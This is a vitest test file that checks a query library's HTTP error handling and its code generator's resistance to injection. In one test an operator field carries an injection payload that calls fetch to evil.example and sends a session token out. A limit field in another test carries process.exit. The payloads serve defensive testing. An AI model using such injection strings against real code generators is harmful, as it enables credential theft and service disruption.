import { describe, it, expect } from "vitest";
import type { SemanticQuery } from "@typesys/core";
import { ApiError, httpCall, querySource } from "../src/index.js";

describe("pressure: httpCall error handling", () => {
  it("a non-JSON error body (a proxy's 502 page, express's 413 page) is an ApiError, not a SyntaxError", async () => {
    const fakeFetch = (async () => new Response("<html><body>Bad Gateway</body></html>", { status: 502, headers: { "content-type": "text/html" } })) as typeof fetch;
    const err = await httpCall({ baseUrl: "http://x/api", fetch: fakeFetch })("GET", "/me").catch((e: unknown) => e);
    expect(err).toBeInstanceOf(ApiError);
    expect(err).toMatchObject({ status: 502 });
  });
});

describe("pressure: querySource emits only code that means the query", () => {
  it("an operator that is not one of the DSL's is refused, never pasted into the generated code", () => {
    const q = {
      type: "airforce.Aircraft",
      filter: { property: "tailNumber", operator: 'eq("x")); fetch("https://evil.example/?t=" + sessionStorage.getItem("typesys.studio.token")); ((0', value: 1 }
    } as unknown as SemanticQuery;
    let out: string | undefined;
    try {
      out = querySource(q);
    } catch {
      out = undefined;
    }
    expect(out ?? "").not.toContain("evil.example");
  });

  it("a non-numeric limit is not pasted raw into the generated code", () => {
    const q = { type: "airforce.Aircraft", limit: "1); process.exit(1); (1" } as unknown as SemanticQuery;
    let out: string | undefined;
    try {
      out = querySource(q);
    } catch {
      out = undefined;
    }
    expect(out ?? "").not.toContain("process.exit");
  });
});
